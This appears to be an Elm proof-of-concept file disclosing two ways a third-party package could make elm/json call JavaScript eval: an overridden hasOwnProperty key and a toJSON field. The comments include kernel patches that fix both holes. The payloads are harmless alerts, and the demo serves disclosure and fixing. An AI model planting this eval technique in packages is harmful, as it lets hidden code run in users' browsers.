module JsonEvalDemoMinimal exposing (main)

import Browser
import Html exposing (Html)
import Html.Attributes
import Html.Events
import Json.Decode
import Json.Encode


main =
    Browser.sandbox
        { init = 0
        , update = \msg _ -> msg
        , view = view
        }


view : Int -> Html Int
view model =
    Html.div []
        [ viewFancyButton1 1 "Demo 1"
        , Html.hr [] []
        , viewFancyButton2 2 "Demo 2"
        , Html.hr [] []
        , Html.text (String.fromInt model)
        ]


{-| Imagine this function coming from a third party package.
It renders a fancy button (though in this example it’s just a plain HTML button).
It sneakily runs some JavaScript code when you click the button (though in this example it isn’t very sneaky).
But the package of course doesn’t advertise the latter :)

This patch for elm/json plugs this hole:

    diff --git a/src/Elm/Kernel/Json.js b/src/Elm/Kernel/Json.js
    index 5623c1d..14e4b23 100644
    --- a/src/Elm/Kernel/Json.js
    +++ b/src/Elm/Kernel/Json.js
    @@ -257,7 +257,7 @@ function _Json_runHelp(decoder, value)
                // TODO test perf of Object.keys and switch when support is good enough
                for (var key in value)
                {
    -               if (value.hasOwnProperty(key))
    +               if (Object.prototype.hasOwnProperty.call(value, key))
                    {
                        var result = _Json_runHelp(decoder.__decoder, value[key]);
                        if (!__Result_isOk(result))

`Object.prototype.hasOwnProperty` is always the `hasOwnProperty` function,
while `value.hasOwnProperty` might have been set to something else.

(JavaScript code can of course override `Object.prototype.hasOwnProperty`,
but then we’re screwed anyway.)

-}
viewFancyButton1 : msg -> String -> Html msg
viewFancyButton1 onClick label =
    Html.button [ Html.Events.on "click" (evilDecoder1 onClick) ]
        [ Html.text label ]


evilDecoder1 : msg -> Json.Decode.Decoder msg
evilDecoder1 msg =
    Json.Decode.at [ "target", "ownerDocument", "defaultView", "eval" ] Json.Decode.value
        |> Json.Decode.map
            (\evalReference ->
                let
                    dangerousObject =
                        Json.Encode.object
                            [ ( "hasOwnProperty", evalReference )
                            , ( "alert('Hacked 1')", Json.Encode.null )
                            ]

                    -- `keyValuePairs` is going to end up calling
                    -- `dangerousObject.hasOwnProperty("alert('Hacked 1')")`
                    vulnerableDecoder =
                        Json.Decode.keyValuePairs Json.Decode.value
                in
                Json.Decode.decodeValue vulnerableDecoder dangerousObject
                    |> always msg
            )


{-| Imagine this function also coming from a third party package.
It uses a different technique to call `eval`.

This patch for elm/json plugs this hole:

    diff --git a/src/Elm/Kernel/Json.js b/src/Elm/Kernel/Json.js
    index 5623c1d..0874203 100644
    --- a/src/Elm/Kernel/Json.js
    +++ b/src/Elm/Kernel/Json.js
    @@ -426,7 +426,11 @@ function _Json_emptyObject() { return {}; }

     var _Json_addField = F3(function(key, value, object)
     {
    -   object[key] = _Json_unwrap(value);
    +   var unwrapped = _Json_unwrap(value);
    +   if (!(key === 'toJSON' && typeof unwrapped === 'function'))
    +   {
    +       object[key] = unwrapped;
    +   }
        return object;
     });

This results in `Json.Encode.object` or `Json.Encode.dict`
ignores trying to set a field called "toJSON" to a function.

We still allow setting _other_ fields to functions, since some people use
the following pattern in Node.js with `Platform.worker`:

    function requestHandler(request) {
      app.ports.onInput.send({ data: request.data, callback: (output) => { request.respond(output.thing); } });
    }

    app.ports.onOutput.subscribe((stuff) => {
      stuff.callback(stuff.output);
    });

-}
viewFancyButton2 : msg -> String -> Html msg
viewFancyButton2 onClick label =
    Html.button [ Html.Events.on "click" (evilDecoder2 onClick) ]
        [ Html.text label ]


evilDecoder2 : msg -> Json.Decode.Decoder msg
evilDecoder2 msg =
    Json.Decode.at [ "target", "ownerDocument", "defaultView", "eval" ] Json.Decode.value
        |> Json.Decode.map
            (\evalReference ->
                let
                    innerDangerousObject =
                        Json.Encode.object [ ( "toJSON", evalReference ) ]

                    dangerousObject =
                        Json.Encode.object [ ( "alert('Hacked 2')", innerDangerousObject ) ]
                in
                -- `Json.Encode.encode` calls `JSON.stringify`, which is going to end up calling
                -- `innerDangerousObject.toJSON("alert('Hacked 2')")`
                Json.Encode.encode 0 dangerousObject
                    |> always msg
            )
